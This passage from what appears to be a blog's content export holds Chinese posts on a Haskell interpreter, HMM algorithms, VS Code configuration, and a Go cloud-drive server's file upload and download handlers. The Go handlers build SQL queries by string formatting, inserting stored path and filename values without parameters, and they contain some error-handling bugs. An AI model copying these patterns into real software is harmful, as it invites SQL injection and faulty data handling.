Float | Boolean Bool | String' String | Param String | Error String | Op String Exp Exp | Lambda Exp Exp | If Exp Exp Exp | Let Exp Exp Exp | Closure Exp Env | Call Exp Exp deriving (Show) 在上面的型别声明中，提供了三种类型的数据（Float、Bool 和 String），以及变量（Param）、错误信息（Error）、运算式（Op）、函数（Lambda）、条件表达式（If）、绑定（Let）、闭包（Closure）和函数调用（Call）。 出于方便考虑，只支持了二元运算符，这从 Exp 的声明中也能看出。如果想支持一元运算符，最简单的方式是增加型别的值构造子，并修改解释器的模式匹配；如果想支持多元运算符，可以绑定嵌套。 Closure 值构造子有一个参数为 Env，它用于维护闭包内表达式所处的环境的副本。 变量、值的绑定 有了上述型别，简单的值可以通过对应的值构造子产生，如 Value 2.34、Boolean True、String&#39; &quot;test&quot; 等。 变量与值的绑定通过类似 Data.Map 的结构，因为值和函数、运算等都可归一为表达式 Exp，因此用一个 [(String, Exp)] 的 list 存放对当前代码区域可见的变量-值绑定，称之为环境。函数 ·extEnv` 扩展已有的环境。 123type Env = [(String, Exp)]extEnv :: String -&gt; Exp -&gt; Env -&gt; EnvextEnv x v env = (x, v) : env 需要查找变量时，在当前环境中检查有无对应的键。因为 extEnv 将后绑定的变量插入到环境的头部，因此可以屏蔽先插入的同名变量，从而模拟出变量的就近原则。 运算符的计算 为了保持解释器主体部分简短，我将运算符的计算提取成单独的函数。其大致结构如下： 123456calc :: String -&gt; Exp -&gt; Exp -&gt; Expcalc \"+\" (Value v1') (Value v2') = Value (v1' + v2')calc \"-\" (Value v1') (Value v2') = Value (v1' - v2')calc \"*\" (Value v1') (Value v2') = Value (v1' * v2')calc \"/\" (Value v1') (Value v2') = Value (v1' / v2')calc ...... -- other patterns 为了支持 String&#39; 和 Boolean 类型的计算，calc 函数必须为每种类型均增加模式匹配。 函数声明和调用 Exp 型别有一个 Lambda 值构造子用来声明函数，解释器遇到 Lambda 表达式时，会将其转化为 Closure 值类型，即将该函数所处的环境保存下来，这么做的目的与 Lexical Scoping 和 Dynamic Scoping 有关。这一点在王垠的文章中讲的很清楚，这里简单提一下。Lexical Scoping，中文为静态域或者词法定界，Dynamic Scoping 为动态作用域，举个例子，let x = 2 in (let f = \\y-&gt; x * y in (let x = 4 in (f 3)))，如果结果为 6 就是 Lexical Scoping，结果为 12 就是 Dynamic Scoping。Dynamic Scoping 会带来很多意想不到的后果，因此要想实现静态域，就要在函数定义时保存其所处的环境，并在函数调用时从该环境中提取变量绑定。 实现的 H2Lang 解释器会在匹配到 Lambda 表达式时将其转化为闭包：interp s@(Lambda _ _) env = Closure s env。 为了方便区分普通表达式和函数调用，我在 Exp 的型别中声明了 Call 值构造子，它将两个表达式组合到一起，并认定第一个表达式代表函数，第二个表达式代表某个变量或者值。因为多元函数可以用柯里化不断简化，因此解释器就不做处理了，在调用时可以通过 Call 的嵌套实现。 当解释器匹配到 Call e1 e2 时，根据当前环境递归调用解释器计算出 e2 最终的表达式，假设 e1 匹配了 Closure (Lambda (Param x) e) env&#39;)，则将计算出 e2 的结果绑定到变量 x，并计算函数的值。 解释器 解释器的主体代码如下，完整代码在 h2lang.hs： 1234567891011121314151617181920212223242526interp :: Exp -&gt; Env -&gt; Expinterp (Param x) env = fromMaybe (Error (\"undefined variable\" ++ x)) (lookup x env)interp (Value x) _ = Value xinterp (Boolean x) _ = Boolean xinterp (String' x) _ = String' xinterp s@(Lambda _ _) env = Closure s envinterp (Let (Param x) e1 e2) env = interp e2 (extEnv x (interp e1 env) env)interp (Op op e1 e2) env = let v1 = interp e1 env v2 = interp e2 env in calc op v1 v2interp (If cond e1 e2) env = let c = interp cond env in case c of Error _ -&gt; Error \"syntax error\" Boolean False -&gt; interp e2 env _ -&gt; interp e1 envinterp (Call e1 e2) env = case v2 of Value _ -&gt; callExp Boolean _ -&gt; callExp String' _ -&gt; callExp _ -&gt; Error \"syntax error\" where v2 = interp e2 env col = interp e1 env callExp = case col of (Closure (Lambda (Param x) e) env') -&gt; interp e (extEnv x v2 env') _ -&gt; Error \"syntax error\" 效果： 123456789101112131415h2 (Let (Param \"x\") (Value 2) (Let (Param \"f\") (Lambda (Param \"y\") (Op \"*\" (Param \"x\") (Param \"y\"))) (Let (Param \"x\") (Value 4) (Call (Param \"f\") (Value 3)))))-- Value 6.0h2 (Let (Param \"x\") (Value 3.9) (Op \"/\" (Param \"x\") (Value 4.32)))-- Value 0.9027778h2 (Let (Param \"x\") (Value 8.75) (Op \"&gt;=\" (Param \"x\") (Value 7)))-- Boolean Trueh2 (Op \"==\" (Boolean True) (Boolean False))-- Boolean Falseh2 (Op \"++\" (String' \"test\") (String' \" case\"))-- String' \"test case\"h2 (If (Op \"&gt;=\" (Value 2.3) (Value (-2.754))) (String' \"Yes\") (String' \"No\"))-- String' \"Yes\" 参考资料： 王垠 - 怎样写一个解释器 Fallenwood - 怎样写一个解释器 (How to Write a (Lisp) Interpreter (in Python)) 知乎 - 如何写 Lisp 解释器 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/02/14/talk-about-interpreter/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Haskell","slug":"Haskell","permalink":"http://forec.github.io/tags/Haskell/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"HMM 关键词检索","slug":"talk-about-hmm","date":"2017-02-06T08:22:30.000Z","updated":"2017-02-14T03:21:34.000Z","comments":true,"path":"2017/02/06/talk-about-hmm/","link":"","permalink":"http://forec.github.io/2017/02/06/talk-about-hmm/","excerpt":"记一下 HMM 的一些总是忘记的名词和计算过程。","text":"记一下 HMM 的一些总是忘记的名词和计算过程。 HMM 离散一阶马尔可夫链：系统在 t 时刻状态只和其在 t-1 时刻的状态相关。 马尔可夫模型：随机过程独立于时间 t，且状态转移概率 Σ a_ij = 1 (j=1..N)。 HMM 可观察到的事件是状态的随机函数，状态转移过程隐蔽（马尔可夫链），事件是一般随机过程。一个随机事件由观察值序列 O = O_1, O_2, .., O_T 表示，该事件背后隐藏着实际的状态序列 Q = q_1, q_2, .., q_T。HMM 的关键在于将两个序列联系起来，用可观察明字符组成的观察序列去表征由离散隐状态组成的状态序列（路径）。 HMM 要求满足马尔可夫性假设（状态构成一阶马尔可夫链）、不动性假设（状态和具体时间无关）以及输出独立性假设（输出，也就是观察到的值仅与背后的状态有关）。 HMM 由五元组 λ = (N, M, A, B, π) 描述： N = {q_1, q_2, .., q_N}：有限状态集合 M = {v_1, v_2, .., v_M}：有限观察值集合 A = {a_ij}：状态转移概率矩阵 B = {b_jk}, b_jk = P(O_t = v_k | q_t = Sj)：观察值概率分布矩阵 π = π_i：初始状态概率分布 给定 HMM 模型 λ = (A, B, π)，观察序列通过状态的不断转移和 B 矩阵产生，初始根据 π 选择 q_1，根据状态转移概率生成 q_t，并根据 q_t = i 和 b_ik 生成 O_t = v_k。 对于给定模型 λ = (π, A, B)，令 O = O_1, O_2, .., O_T 为观察值序列，三个基本问题及解决方案： 评估问题（前向算法）：对于给定模型，求任意观察值序列的概率 P(O | λ)。 解码问题（韦特比算法）：对于给定模型和观察值序列，求可能性最大的状态序列 maxQ{P(Q | O, λ)}，也称 Q 为最优路径。即有效选择 “最优” 状态序列以尽量好地解释观察序列。 学习问题（向前向后算法）：给定观察值序列，调整 λ 使该观察值序列出现的概率 P(O | λ) 最大。 前向算法 α(t, i) = P(o_1, o_2, .., o_T, q_t = S_i | λ) 指 “在时刻 t，得到 t 之前的所有明符号序列，且时刻 t 的状态是 S_i” 这一事件的概率。 α(1, i) = P(o_1, q_1 = S_i | λ) = π(i)b(i, o_1)； 递推：`α(t+1, j) = [Σ α(t, i) · a(i, j), i=1..N] × b(j, o_t+1)； α(T, i) = P(o_1, .., o_T, q_T = S_i | λ)； P(O | λ) = Σ α(T, i), (i = 1..N) Viterbi 算法 算法和卷积码的韦特比解码同名，因为本质就一样。 δ(t, i) 为在 1..t 时刻按照状态序列 q_1, .., q_t 且 q_t = S_i 能够产生出 o_1, o_2, .., o_t 的最大概率，即 δ(t, i) = max{ P(q_1, .., q_t-1, q_t = Si, o_1, .., o_t | λ) }。序列 o 和系统 λ 都是确定的，max 根据序列 q 的变动选取最优解。 记忆变量：φ(t, i) 记录概率最大路径上当前状态的前一个状态。 初始化：δ(1, i) = π(i)b(i, O_1)，φ(1, i) = 0； 递推 ：δ(t, j) = max{δ(t-1, j) × a_ji} × b(i, O_t), 2 ≤ t ≤ T, 1 ≤ i ≤ N； 终止：p* = max{δ(T, i)}； 路径回溯：q* = φ(t+1, q*_t+1), t = T-1, T-2, .., 1。 向前向后算法 最大似然估计无法解决学习问题，因为 HMM 中的状态序列为隐变量，无法被观察到。EM 算法由交替的 “期望” 过程（E）和 “极大似然估计” 过程（M）组成，E 过程从条件期望中构造完全数据的似然函数值，M 过程利用参数的统计量重新估计概率模型的参数，使训练数据对数似然最大。 初始化：满足概率条件的情况下随机给 π_i、a_ij 和 b_jk 赋值，得模型 λ_0，设 i = 0； E 过程：由 λ_i 根据下面公式计算期望值 ε(t, i, j)（给定模型和观察序列，在时间 t 位于状态 S_i，时间 t+1 位于状态 S_j 的概率） 和 γ(t, i)（给定模型和观察序列，在时间 t 位于状态 i 的概率），E 过程的期望是根据上一个 M 过程重估后的模型计算的； 12345ε(t, i, j) = P(q_t = S_i, q_t+1 = S_j | O, λ) = P(q_t = S_i, q_t+1 = S_j, O | λ) / P(O | λ) = α(t, i)· a(i, j) · b(j, O_t+1) · β(t+1, j) / P(O | λ) = α(t, i)· a(i, j) · b(j, O_t+1) · β(t+1, j) / &#123;Σi Σj α(t, i) · a(i, j) · b(j, O_t+1) · β(t+1, j) &#125;γ(t, i) = Σj ε(t, i, j) M 过程：根据 E 过程得出的期望值，根据下面公式重新估计 πi，a_ij 和 b_jk，得到模型 λ_i+1。 123π(i) = P(q_1 = S_i) = γ(1, i)a(i, j) = &#123;Σt ε(t, i, j)&#125; / &#123;Σt γ(t, i)&#125;, t = 1..T-1b(j, k) = &#123;Σt γ(t, j) × δ(O_t, v_k)&#125; / &#123;Σt γ(t, j)&#125;, t = 1..T 重复 E、M 过程直到模型收敛。 问题 前向算法、Viterbi 和 Baum-Welch 算法的概率值连续乘法运算容易下溢。 前向算法中每步运算都可以乘一个比例因子 c(t)，如下： 123α(t+1, j) = [Σ α(t, i) · a(i, j), i=1..N] × b(j, o_t+1)α'(t+1, j) = c(t) × [Σ α(t, i)' · a(i, j), i=1..N] × b(j, o_t+1)c(t) = 1 / Σ α(t, i) , i = 1..N Viterbi 算法可以将概率值取对数（乘积化为对数求和）。 相关链接 逼乎 “如何用通俗易懂的例子解释 HMM” 我邮学长 Nong Bloody 的博客 hankcs 的隐马模型笔记 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/02/06/talk-about-hmm/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"},{"name":"机器学习","slug":"机器学习","permalink":"http://forec.github.io/tags/机器学习/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"VS Code 配置记录","slug":"vscode-configuration","date":"2017-01-31T07:38:13.000Z","updated":"2017-01-31T12:26:00.000Z","comments":true,"path":"2017/01/31/vscode-configuration/","link":"","permalink":"http://forec.github.io/2017/01/31/vscode-configuration/","excerpt":"VS Code 的配置记录。","text":"VS Code 的配置记录。 全局配置编辑器配置 参考 Fallendwood 的 Blog，我个人修改后配置如下： 1234567&#123; \"window.reopenFolders\": \"all\", \"editor.fontSize\": 15, \"editor.tabSize\": 2, \"editor.formatOnType\": true, \"extensions.autoUpdate\": true&#125; git git 扩展默认开启，修改 git.path 和 git.autofetch。 终端集成 配置 &quot;terminal.integrated.shell.windows&quot;: &quot;C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe&quot;。 C/C++ 安装 c/c++，c/c++ clang 和 clang-format 插件。 安装 Native Debug 插件。 launch.json 用来配置启动任务，修改 launch.json 来配置调试： 1234567891011121314151617181920&#123; \"version\": \"0.2.0\", \"configurations\": [ &#123; \"name\": \"C++ Launch (GDB)\", // 配置名称，将会在启动配置的下拉菜单中显示 \"type\": \"cppdbg\", // 配置类型，这里只能为cppdbg \"request\": \"launch\", // 请求配置类型，可以为launch（启动）或attach（附加） \"launchOptionType\": \"Local\", // 调试器启动类型，这里只能为Local \"targetArchitecture\": \"x86\", // 生成目标架构，一般为x86或x64，可以为x86, arm, arm64, mips, x64, amd64, x86_64 \"program\": \"$&#123;file&#125;.exe\", // 将要进行调试的程序的路径 \"miDebuggerPath\":\"path/to/gdb.exe\", // miDebugger的路径，注意这里要与MinGw的路径对应 \"args\": [\"blackkitty\", \"1221\", \"# #\"], // 程序调试时传递给程序的命令行参数，一般设为空即可 \"stopAtEntry\": false, // 设为true时程序将暂停在程序入口处，一般设置为false \"cwd\": \"$&#123;workspaceRoot&#125;\", // 调试程序时的工作目录，一般为$&#123;workspaceRoot&#125;即代码所在目录 \"externalConsole\": true, // 调试时是否显示控制台窗口，一般设置为true显示控制台 \"preLaunchTask\": \"g++\" // 调试会话开始前执行的任务，一般为编译程序，c++为g++, c为gcc &#125; ]&#125; Ctrl + Shift + P，输入 Run Build Tasks，配置 tasks.json： 1234567891011121314151617&#123; \"version\": \"0.1.0\", \"command\": \"g++\", \"args\": [\"-g\",\"$&#123;file&#125;\",\"-o\",\"$&#123;file&#125;.exe\"], // 编译命令参数 \"problemMatcher\": &#123; \"owner\": \"cpp\", \"fileLocation\": [\"relative\", \"$&#123;workspaceRoot&#125;\"], \"pattern\": &#123; \"regexp\": \"^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$\", \"file\": 1, \"line\": 2, \"column\": 3, \"severity\": 4, \"message\": 5 &#125; &#125;&#125; 自动补全：Ctrl + Shift + P 输入 settings 打开用户设置，配置 clang.executable、clang.cflags 和 clang.cxxflags： 12345678910111213141516171819\"clang.cxxflags\": [ \"-std=c++1y\", \"-Wall\", \"-I/mingw64/include\", \"-I/mingw64/x86_64-w64-mingw32/include\", \"-I/mingw64/lib/gcc/x86_64-w64-mingw32/6.3.0/include\", \"-I$&#123;workspaceRoot&#125;/include\", \"-I$&#123;cwd&#125;\"],\"clang.cflags\": [ \"-std=c99\", \"-Wall\", \"-I/mingw64/include\", \"-I/mingw64/x86_64-w64-mingw32/include\", \"-I/mingw64/lib/gcc/x86_64-w64-mingw32/6.3.0/include\", \"-I$&#123;workspaceRoot&#125;/include\", \"-I$&#123;cwd&#125;\"],\"clang.executable\": \"/mingw64/bin/clang.exe\" 配置 cpptools 的 c_cpp_properties.json，将对应系统的 include 项修改为 settings.json 中相同的几个路径。 按 F8 可生成目标文件和可执行文件，按 F5 启动调试。 HTML 标签自动关闭可安装插件 Auto Close Tag。 根据开始标签自动修改关闭标签可安装插件 Auto Rename Tag。 Go Go 语言有唯一的插件可以安装。需要手动 go get 所需的工具。 Python 安装 Python 插件，配置一下 python.pythonPath 就可以使用。 主题、配色 Ctrl + Shift + P 输入 File Icon Theme 可以修改图标主题。 Code Runner 可以选中一行/几行代码并右击运行，功能非常强大，用处比较大。 需要在文件头部加上固定内容可以使用插件 vscode-file-header-comment-helper。 改背景图 Background。 彩虹括号 Rainbow Brackets。 Project Manager 可在多个 git 项目之间切换。 File Peeker 可点击编辑内容中的文件名并打开文件。 Path Intellisense 可自动补全路径。 参考资料： Fallendwood 的配置介绍 Windows下VSCode编译调试c/c++ - 黑猫崽儿的 CSDN 博客 How do I set up VSCode to compile C++ code? - StackOverFlow windows下用visual studio code 调试go代码 Visual Studio Code 介绍 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/01/31/vscode-configuration/) 、作者信息（Forec）和本声明。","categories":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}],"tags":[],"keywords":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}]},{"title":"顶点云（应用）文件传输","slug":"zenith-cloud-8","date":"2017-01-15T13:22:07.000Z","updated":"2017-02-15T14:05:52.000Z","comments":true,"path":"2017/01/15/zenith-cloud-8/","link":"","permalink":"http://forec.github.io/2017/01/15/zenith-cloud-8/","excerpt":"设计文件传输代理和具体的实现细节，包括文件的上传和批量下载。","text":"设计文件传输代理和具体的实现细节，包括文件的上传和批量下载。 传输代理 在 顶点云（应用）用户代理 中介绍了客户端发送的不涉及文件传输的指令处理。涉及文件传输的操作由客户端启动独立的线程申请，并在独立线程中将命令转交给 rc.dealWithTransmissions() 方法： 123456789101112131415161718192021func (u *cuser) DealWithTransmission(db *sql.DB, t trans.Transmitable) &#123; // 传输结束后从用户传输列表移除线程 defer u.RemoveTransmit(t) recvB, err := t.RecvBytes() if err != nil &#123; u.RemoveTransmit(t) return &#125; command := string(recvB) switch &#123; case len(command) &gt;= 3 &amp;&amp; strings.ToUpper(command[:3]) == \"GET\": // 下载请求 u.get(db, command, t) case len(command) &gt;= 3 &amp;&amp; strings.ToUpper(command[:3]) == \"PUT\": // 上传请求 u.put(db, command, t) default: // 指令无法识别 t.SendBytes(auth.Int64ToBytes(300)) &#125;&#125; 涉及传输操作的只有上传和下载。下载支持目录，即客户端可以在用户本地构建云盘的目录结构并复现整个目录。上传操作仅支持单个文件上传，但客户端可以通过 Facade 模式将上传包装，在客户端处理小文件的拼凑、多个文件的异步/同步上传。 文件上传 文件上传的流程在《顶点云认证、传输协议设计》中详细叙述过，以下代码实现了该流程，各段代码的解释已经写在注释中： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161func (u *cuser) put(db *sql.DB, command string, t trans.Transmitable) &#123; // 传输流程: // 收取下载指令：PUT&lt;SEP&gt;上传文件uid&lt;SEP&gt;上传文件大小&lt;SEP&gt;上传文件 md5 值 // 验证指令合法性并回送代码 // 合法则启动传输，否则结束传输 var err1, err2, err error var uid, _cid, cid, size, _ref, ref int var shouldTransmit, valid bool = true, true var queryRow *sql.Row args := generateArgs(command, 4) if args == nil &#123; valid = false // 指令不合法，无法获取参数 &#125; else &#123; uid, err1 = strconv.Atoi(args[1]) size, err2 = strconv.Atoi(args[2]) if err1 != nil || err2 != nil || size &lt;= 0 || strings.ToUpper(args[0]) != \"PUT\" || // 指令格式错误 !auth.IsMD5(args[3]) &#123; valid = false &#125; else &#123; // 查找实体文件列表中是否存在相同 md5 值的文件，并获取实体文件引用数 queryRow = db.QueryRow(fmt.Sprintf(`select uid, ref from cfile where md5='%s' and size=%d`, strings.ToUpper(args[3]), size)) if queryRow == nil &#123; shouldTransmit = true &#125; else &#123; err = queryRow.Scan(&amp;cid, &amp;ref) if err == nil &#123; shouldTransmit = false &#125; &#125; &#125; &#125; // 判断是否启动传输 fmt.Println(shouldTransmit) if valid != true &#123; // 指令不合法或文件不存在时发送 300 错误码 t.SendBytes(auth.Int64ToBytes(300)) return &#125; else if shouldTransmit &#123; // 启动传输返回 201 错误码 t.SendBytes(auth.Int64ToBytes(201)) fmt.Println(\"启动上传，返回 201\") // 使用 md5 值创建临时文件并获取待临时文件句柄 file, err := os.OpenFile(conf.STORE_PATH+args[3], os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0666) if err != nil &#123; t.SendBytes(auth.Int64ToBytes(500)) return &#125; // 启动数据传输函数 fileWriter := bufio.NewWriter(file) if !t.RecvToWriter(fileWriter) &#123; t.SendBytes(auth.Int64ToBytes(203)) return &#125; _, err = db.Exec(fmt.Sprintf(`insert into cfile values(null, '%s', %d, 0, '%s')`, strings.ToUpper(args[3]), size, time.Now().Format(\"2006-01-02 15:04:05\"))) if err != nil &#123; t.SendBytes(auth.Int64ToBytes(500)) return &#125; // 获取新加入实体文件的编号 queryRow = db.QueryRow(`select max(uid) from cfile`) if queryRow == nil &#123; t.SendBytes(auth.Int64ToBytes(500)) return &#125; else &#123; err = queryRow.Scan(&amp;cid) if err != nil &#123; t.SendBytes(auth.Int64ToBytes(500)) return &#125; &#125; file.Close() // 修改临时文件名为实体文件编号 err = os.Rename(conf.STORE_PATH+args[3], fmt.Sprintf(\"%s%d\", conf.STORE_PATH, cid)) if err != nil &#123; t.SendBytes(auth.Int64ToBytes(500)) return &#125; // 获取实体文件句柄，计算 MD5 以验证用户提供的 MD5 值是否合法 file, err = os.Open(fmt.Sprintf(\"%s%d\", conf.STORE_PATH, cid)) if err != nil &#123; t.SendBytes(auth.Int64ToBytes(500)) return &#125; fileReader := bufio.NewReader(file) _md5 := auth.CalcMD5ForReader(fileReader) file.Close() if _md5 == nil &#123; // 计算 MD5 值失败 t.SendBytes(auth.Int64ToBytes(500)) return &#125; if strings.ToUpper(string(args[3])) != strings.ToUpper(string(_md5)) &#123; // 用户声明的 MD5 值和服务器计算的 MD5 值不一致 t.SendBytes(auth.Int64ToBytes(403)) // 从数据库删除实体文件记录，并从文件存储路径删除实体文件 db.Exec(fmt.Sprintf(\"delete from cfile where uid=%d\", cid)) os.Remove(fmt.Sprintf(\"%s%s\", conf.STORE_PATH, cid)) return &#125; ref = 0 &#125; // 检查用户是否已创建要上传的文件 queryRow = db.QueryRow(fmt.Sprintf(`select cfileid from ufile where uid=%d and ownerid=%d`, uid, u.id)) if queryRow == nil &#123; t.SendBytes(auth.Int64ToBytes(301)) return &#125; else &#123; err = queryRow.Scan(&amp;_cid) if err != nil &#123; t.SendBytes(auth.Int64ToBytes(500)) return &#125; &#125; // 用户文件引用的实体文件未发生变化，实体文件引用数不需更新 if _cid == cid &#123; // 向客户端发送 200 代码，确认传输结束 t.SendBytes(auth.Int64ToBytes(200)) return &#125; // 获取实体文件的引用记录数 queryRow = db.QueryRow(fmt.Sprintf(`select ref from cfile where uid=%d`, _cid)) if _cid &gt; 0 &amp;&amp; queryRow != nil &#123; err = queryRow.Scan(&amp;_ref) if err == nil &#123; if _ref != 1 &#123; db.Exec(fmt.Sprintf(`update cfile set ref=%d where uid=%d`, _ref-1, _cid)) &#125; else &#123; db.Exec(fmt.Sprintf(`delete from cfile where uid=%d`, _cid)) &#125; &#125; &#125; // 更新资源文件引用的实体文件编号 _, err = db.Exec(fmt.Sprintf(`update ufile set cfileid=%d where uid=%d and ownerid=%d`, cid, uid, u.id)) if err != nil &#123; t.SendBytes(auth.Int64ToBytes(500)) return &#125; // 更新实体文件的引用记录数 _, err = db.Exec(fmt.Sprintf(`update cfile set ref=%d where uid=%d`, ref+1, cid)) if err != nil &#123; t.SendBytes(auth.Int64ToBytes(500)) &#125; else &#123; u.used += int64(size) db.Exec(fmt.Sprintf(`update cuser set used=%d where uid=%d`, u.used, u.id)) // 更新用户使用云盘容量 t.SendBytes(auth.Int64ToBytes(200)) &#125;&#125; 文件（夹）下载 单个文件或者一个目录的批量传输流程在《顶点云认证、传输协议设计》中详细叙述过，下面的代码已添加注释： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212func (u *cuser) get(db *sql.DB, command string, t trans.Transmitable) &#123; // 指令格式: GET&lt;SEP&gt;文件uid&lt;SEP&gt;提取码 var err error var isdir, private bool var uid, valid int = 0, 0 var recordCount, ownerid, cfileid, parentLength, downloaded int var pass, filename, originFilename, path, subpath string var queryRow *sql.Row var queryRows *sql.Rows var fileReader *bufio.Reader args := generateArgs(command, 3) if args == nil &#123; valid = 1 // 无法获取参数，valid = 1：指令不合法 goto GET_VERIFY &#125; uid, err = strconv.Atoi(args[1]) if err != nil || strings.ToUpper(args[0]) != \"GET\" &#123; // 参数格式不正确，指令不合法 valid = 1 goto GET_VERIFY &#125; queryRow = db.QueryRow(fmt.Sprintf(`select isdir, private, ownerid, linkpass, cfileid, filename, path, downloaded from ufile where uid=%d`, uid)) if queryRow == nil &#123; valid = 2 // 数据库查询出错，valid = 2：无法获取记录 goto GET_VERIFY &#125; queryRow.Scan(&amp;isdir, &amp;private, &amp;ownerid, &amp;pass, &amp;cfileid, &amp;filename, &amp;path, &amp;downloaded) if int64(ownerid) != u.id &amp;&amp; pass != args[2] || int64(ownerid) != u.id &amp;&amp; private &#123; // 用户不是资源所有者且提取码不正确 或 用户不是资源所有者且资源为私有 valid = 3 // 用户不具有权限，valid = 3：无法下载 goto GET_VERIFY &#125;GET_VERIFY: if valid != 0 &#123; // 指令执行失败，发送错误码 t.SendBytes([]byte(\"NOTPERMITTED\")) return &#125; else &#123; // 指令被允许执行，激活 t.SendBytes([]byte(\"VALID\")) &#125; // 更新待下载资源的下载次数 db.Exec(fmt.Sprintf(`update ufile set downloaded=%d where uid=%d`, downloaded+1, uid)) var totalFileLength int = 0 if !isdir &#123; // 仅下载单个文件时，待发送文件数目为 1 if !t.SendBytes(auth.Int64ToBytes(int64(1))) &#123; return &#125; // 发送待下载文件文件名 if !t.SendBytes([]byte(filename)) &#123; return &#125; // 发送待下载资源的类型（文件/目录） if !t.SendBytes([]byte(auth.Int64ToBytes(int64(0)))) &#123; return &#125; if cfileid &lt; 0 &#123; // 文件未引用实体文件，则为空文件 t.SendFromReader(nil, int64(0)) &#125; else &#123; // 提取实体文件的大小 queryRow = db.QueryRow(fmt.Sprintf(`select size from cfile where uid=%d`, cfileid)) if queryRow == nil &#123; return &#125; queryRow.Scan(&amp;totalFileLength) // 获取实体文件句柄 file, err := os.Open(fmt.Sprintf(\"%s%d\", conf.STORE_PATH, cfileid)) if err != nil &#123; return &#125; defer file.Close() fileReader = bufio.NewReader(file) // 启动传输 t.SendFromReader(fileReader, int64(totalFileLength)) &#125; &#125; else &#123; // 用户试图下载一个目录，需计算共传输多少文件/目录 queryRow = db.QueryRow(fmt.Sprintf(`select count (*) from ufile where path like '%s%%' and ownerid=%d`, path+filename+\"/\", u.id)) originFilename = filename if queryRow == nil &#123; return &#125; // 扫描待下载文件数目 err = queryRow.Scan(&amp;recordCount) if err != nil &#123; return &#125; // 增加 1 个待下载数量（根目录） recordCount += 1 // 发送待下载文件数量 if !t.SendBytes(auth.Int64ToBytes(int64(recordCount))) &#123; return &#125; // 发送根目录名 if !t.SendBytes([]byte(filename)) &#123; return &#125; // 发送 1（根目录类型为 1，目录） if !t.SendBytes(auth.Int64ToBytes(int64(1))) &#123; return &#125; parentLength = len(path) // 提取待下载目录下的目录结构 queryRows, err = db.Query(fmt.Sprintf(`select filename, path from ufile where path like '%s%%' and isdir=1 and ownerid=%d order by length(path)`, path+filename+\"/\", ownerid)) if err != nil &#123; return &#125; for queryRows.Next() &#123; err = queryRows.Scan(&amp;filename, &amp;subpath) if err != nil &#123; continue &#125; filename = subpath[parentLength:] + filename // 根据客户端版本决定是否修改路径中的分隔符 if conf.CLIENT_VERSION == \"Windows\" &#123; filename = strings.Replace(filename, \"/\", \"\\\\\", -1) &#125; // 发送相对路径名 if !t.SendBytes([]byte(filename)) &#123; return &#125; // 发送 1（目录类型） if !t.SendBytes(auth.Int64ToBytes(int64(1))) &#123; return &#125; &#125; // 发送待下载路径下的文件 queryRow = db.QueryRow(fmt.Sprintf(`select count (*) from ufile where path like '%s%%' and isdir=0 and ownerid=%d`, path+originFilename+\"/\", ownerid)) if queryRow == nil &#123; return &#125; err = queryRow.Scan(&amp;recordCount) if err != nil &#123; return &#125; // 待下载文件信息列表 file_list := make([]downloadItem, 0, recordCount) var fileItem downloadItem queryRows, err = db.Query(fmt.Sprintf(`select filename, path, cfileid from ufile where path like '%s%%' and isdir=0 and ownerid=%d order by length(path)`, path+originFilename+\"/\", ownerid)) if err != nil &#123; return &#125; for queryRows.Next() &#123; err = queryRows.Scan(&amp;filename, &amp;subpath, &amp;cfileid) if err != nil &#123; continue &#125; // 获取实体文件大小，若无实体文件编号则大小为 0 if cfileid &lt; 0 &#123; totalFileLength = 0 &#125; else &#123; queryRow = db.QueryRow(fmt.Sprintf(`select size from cfile where uid=%d`, cfileid)) if queryRow == nil &#123; totalFileLength = 0 continue &#125; err = queryRow.Scan(&amp;totalFileLength) if err != nil &#123; totalFileLength = 0 continue &#125; &#125; fileItem.size = totalFileLength // 生成文件在客户端的相对路径 filename = subpath[parentLength:] + filename // 根据客户端系统替换路径分隔符 if conf.CLIENT_VERSION == \"Windows\" &#123; filename = strings.Replace(filename, \"/\", \"\\\\\", -1) &#125; fileItem.filename = filename fileItem.cfileid = cfileid file_list = append(file_list, fileItem) &#125; for _, fileItem = range file_list &#123; // 发送文件名 if !t.SendBytes([]byte(fileItem.filename)) &#123; break &#125; fmt.Println(\"发送文件名: \", fileItem.filename) // 发送 0 （文件类型） if !t.SendBytes(auth.Int64ToBytes(int64(0))) &#123; break &#125; if fileItem.size &gt; 0 &amp;&amp; fileItem.cfileid &gt;= 0 &#123; // 待下载文件引用了实体文件，获取实体文件句柄 file, err := os.Open(fmt.Sprintf(\"%s%d\", conf.STORE_PATH, fileItem.cfileid)) if err != nil &#123; // 发生错误时发送空文件 fileItem.size = 0 fileReader = nil &#125; else &#123; defer file.Close() fileReader = bufio.NewReader(file) &#125; &#125; else &#123; fileReader = nil &#125; // 发送文件，空文件使 reader 为 nil 